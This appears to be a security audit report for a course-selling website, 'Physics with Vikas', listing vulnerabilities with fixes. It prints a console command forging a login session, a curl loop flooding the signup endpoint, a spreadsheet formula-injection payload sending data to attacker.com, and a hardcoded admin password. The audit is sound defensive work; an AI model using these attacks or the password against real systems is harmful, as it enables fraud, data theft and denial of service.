# 🔐 Security Vulnerability Report
## Physics with Vikas — Penetration Analysis

---

## 🚨 CRITICAL VULNERABILITIES

### 1. localStorage Auth Bypass (CRITICAL)
**What:** Authentication is entirely client-side in localStorage.
**Attack:** Open browser DevTools console and run:
```js
localStorage.setItem("pwv_user", JSON.stringify({name:"Hacker",phone:"9999999999",email:"h@x.com",loggedIn:true}))
```
**Impact:** Anyone can fake a logged-in session, access dashboard, submit fake payments.
**Fix:** Never trust localStorage for auth. Add server-side session tokens (JWT via Firebase Auth or similar).

---

### 2. Direct Page Access Without Auth (CRITICAL)
**What:** Protected pages like `dashboard.html`, `admin.html`, `access.html` only check localStorage.
**Attack:** Anyone with the URL can navigate directly. The JS auth check can be bypassed by:
- Disabling JavaScript in browser
- Editing localStorage before page load
- Using a browser extension to inject `loggedIn:true`
**Fix:** Move auth checks to server-side. Use proper session cookies (HttpOnly, Secure).

---

### 3. Admin Password in Frontend JS (CRITICAL)
**What:** `admin.html` contains:
```js
const ADMIN_PASS = "vikas2024admin";
```
**Attack:** Any user viewing page source (Ctrl+U or DevTools) sees the admin password instantly.
**Impact:** Full admin access to payment verification, student data viewing.
**Fix:** Never hardcode passwords in frontend. Use a proper backend authentication system.

---

### 4. Apps Script Endpoint Open to Abuse (HIGH)
**What:** The Google Apps Script URL is:
- Hardcoded in `script.js` (visible to all users)
- Accepts POST from anyone without authentication
- No rate limiting
**Attack:**
```bash
# Spam the signup endpoint
for i in $(seq 1 1000); do
  curl -X POST "YOUR_APPS_SCRIPT_URL" \
    -H "Content-Type: application/json" \
    -d '{"action":"signup","name":"Spam","phone":"9999999999","email":"spam@test.com"}'
done
```
**Impact:** Google Sheet flooded with fake data, Apps Script quota exhausted (making real submissions fail), DoS.
**Fix:** Add HMAC signature or secret token to requests. Implement rate limiting via Apps Script (track IPs). Move URL to environment variable.

---

### 5. UPI Payment Spoofing (HIGH)
**What:** Payment "verification" is purely manual. Anyone can submit:
```json
{
  "name": "Rahul Sharma",
  "phone": "9876543210",
  "email": "rahul@email.com",
  "remark": "PhysicsCourse_RahulSharma"
}
```
...without actually paying a rupee.
**Attack:** Submit the payment form with a fake (but plausible) remark. If admin is overwhelmed with submissions, fake entries may get verified.
**Impact:** Free course access through social engineering.
**Fix:** Admin must rigorously cross-check every remark against UPI transaction history. Consider adding UTR (bank reference number) field. Never grant access based on remark alone.

---

### 6. Google Drive Link Forwarding (HIGH)
**What:** Once a Drive link is shared, it can be forwarded to anyone.
**Attack:** Student shares their Drive link on Telegram/WhatsApp groups — unlimited free access for others.
**Impact:** Revenue loss, unauthorized access.
**Fix:**
- Share Drive access only to specific Gmail addresses (not "anyone with link")
- Periodically audit who has access
- Use Google Drive's "restrict downloading" option for sensitive content
- Add watermarks to PDF notes with student name

---

### 7. Formula Injection in Google Sheets (MEDIUM)
**What:** User inputs like name/email go directly into Google Sheets.
**Attack:** Enter as name: `=IMPORTURL("https://attacker.com/steal?d="&A1:Z100)`
**Impact:** Google Sheets formula execution, potential data exfiltration.
**Fix:** The Apps Script `sanitize()` function prepends `'` to inputs starting with `=+-@`. Ensure this is always applied.

---

### 8. DevTools Console Access Control Bypass (MEDIUM)
**What:** UX controls (disable right-click, F12) are cosmetic — easily bypassed:
- Right-click in address bar → Inspect
- Use browser menu instead of F12
- Chrome → View → Developer → Developer Tools
**Impact:** Students can view source, inspect network requests, extract Drive links.
**Fix:** These controls are deterrents only, not security. Add proper content protection at the Drive level.

---

### 9. Cross-Site Request Forgery on Apps Script (MEDIUM)
**What:** Apps Script endpoint accepts POST from any origin.
**Attack:** Malicious website can make requests to your Apps Script endpoint on behalf of visitors.
**Fix:** Add CSRF token to requests. Validate `Origin` header in Apps Script (limited effectiveness due to CORS behavior).

---

### 10. localStorage Data Manipulation (MEDIUM)
**What:** Purchase history stored in localStorage.
```js
localStorage.setItem("pwv_purchases", JSON.stringify(["c1","c2"]))
```
**Impact:** User can fake purchased courses, access the "access" page (though Drive link still requires admin grant).
**Impact is limited** because access.html only shows a Drive link — which still requires the admin to have shared the folder with the user's email.
**Fix:** Server-side purchase verification.

---

### 11. Apps Script URL Enumeration (LOW)
**What:** Anyone who views your `script.js` source gets the Apps Script URL.
**Attack:** Use the URL to query `?action=getPayments` (blocked by ADMIN_SECRET, but URL exposure itself is a risk).
**Fix:** Obfuscate or proxy the Apps Script URL. Use a custom domain.

---

### 12. YouTube Embed Policy Bypass (LOW)
**What:** Reels use YouTube embeds. YouTube's algorithm can recommend unrelated content.
**Fix:** Use `?rel=0` parameter (already implemented). Consider self-hosting educational clips.

---

## ✅ IMPLEMENTED MITIGATIONS

| Control | Status |
|---------|--------|
| Right-click disabled | ✅ Implemented (cosmetic) |
| Text selection disabled | ✅ Implemented (cosmetic) |
| F12 / DevTools blocked | ✅ Implemented (bypassed easily) |
| Input sanitization (Sheet injection) | ✅ In Apps Script |
| Admin password gate | ✅ (but exposed in source) |
| ADMIN_SECRET for payments endpoint | ✅ In Apps Script |

---

## 🛡️ RECOMMENDED SECURITY ROADMAP

### Phase 1 (Immediate — No Cost)
- [ ] Move admin password to a separate, non-public file
- [ ] Add UTR/transaction ID field to payment form
- [ ] Share Drive only with specific emails, NOT "anyone with link"
- [ ] Add watermarks to all PDF notes
- [ ] Audit Google Sheet access permissions

### Phase 2 (Short-term)
- [ ] Add Apps Script rate limiting (track email/IP with timestamp)
- [ ] Implement HMAC-signed requests between frontend and Apps Script
- [ ] Add honeypot fields to detect bot submissions

### Phase 3 (Production-grade)
- [ ] Migrate auth to Firebase Authentication
- [ ] Store purchase status server-side (Firestore)
- [ ] Implement proper session tokens (JWT)
- [ ] Add UPI payment verification via bank API or Razorpay webhook
- [ ] Use environment variables for all secrets (not in code)

---

## ⚠️ FINAL RISK SUMMARY

| Risk | Severity | Ease of Exploit |
|------|----------|----------------|
| Admin password in source | 🔴 CRITICAL | Very Easy |
| localStorage auth bypass | 🔴 CRITICAL | Easy |
| Apps Script endpoint abuse | 🟠 HIGH | Moderate |
| UPI payment spoofing | 🟠 HIGH | Easy |
| Drive link sharing | 🟠 HIGH | Easy |
| Formula injection | 🟡 MEDIUM | Moderate |
| Purchase history manipulation | 🟡 MEDIUM | Easy |
| DevTools bypass | 🟡 MEDIUM | Very Easy |

---

**This application is suitable for MVP/early-stage use with small student cohorts where manual verification is feasible. For scale (100+ students), Phase 3 mitigations are essential.**
